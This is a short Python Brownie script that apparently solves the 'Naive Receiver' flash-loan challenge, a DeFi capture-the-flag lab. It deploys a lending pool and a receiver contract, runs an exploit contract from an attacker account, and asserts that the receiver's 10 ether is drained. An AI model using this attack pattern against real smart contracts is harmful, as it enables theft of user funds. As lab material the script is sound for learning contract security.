from brownie import NaiveReceiverLenderPool, FlashLoanReceiver, naivereciever_Exploit, accounts, Wei
ETHER_IN_POOL = 1000
ETHER_IN_RECEIVER = 10


def deploy():
    deployer, attacker, someuser = accounts[:3]

    pool = NaiveReceiverLenderPool.deploy(
        {'from': deployer})
    deployer.transfer(to=pool, amount=Wei(f'{ETHER_IN_POOL} ether'))

    assert pool.balance() == Wei(f'{ETHER_IN_POOL} ether')
    assert pool.fixedFee() == Wei('1 ether')

    receiver = FlashLoanReceiver.deploy(pool, {'from': deployer})
    deployer.transfer(to=receiver, amount=Wei(f'{ETHER_IN_RECEIVER} ether'))

    assert receiver.balance() == Wei(f'{ETHER_IN_RECEIVER} ether')

    return deployer, attacker, someuser, pool, receiver


def exploit(pool, receiver, attacker):
    exploit = naivereciever_Exploit.deploy(pool, receiver, {'from': attacker})
    exploit.exploit({'from': attacker})


def after(pool, receiver):
    assert receiver.balance() == 0
    assert pool.balance() == Wei(f'{ETHER_IN_POOL+ETHER_IN_RECEIVER} ether')


def main():
    deployer, attacker, someuser, pool, receiver = deploy()

    exploit(pool, receiver, attacker)

    after(pool, receiver)
